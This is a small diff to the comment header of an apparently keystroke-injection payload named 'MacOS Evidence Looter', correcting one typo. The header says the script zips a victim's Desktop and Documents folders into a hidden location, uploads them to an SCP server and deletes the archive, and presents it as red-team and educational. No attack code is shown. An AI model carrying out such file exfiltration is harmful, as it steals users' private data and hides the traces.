@@ -1,6 +1,6 @@
 REM Title: MacOS Evidence Looter
 REM Author: un1x01d
-REM Description: The script will compress the Desktop and Documents folders in a hidden location, afterwhich the file will be uploaded to an SCP server an deleted.
+REM Description: The script will compress the Desktop and Documents folders in a hidden location, afterwhich the file will be uploaded to an SCP server and deleted.
 REM Notes: This script was created to help with a red-team engagements requiring actual data as evidence. This payload has been created ONLY for educational purposes.
 REM Target: MacOS 11.0+ (Built-in ssh/scp)
 REM Version: 1.1
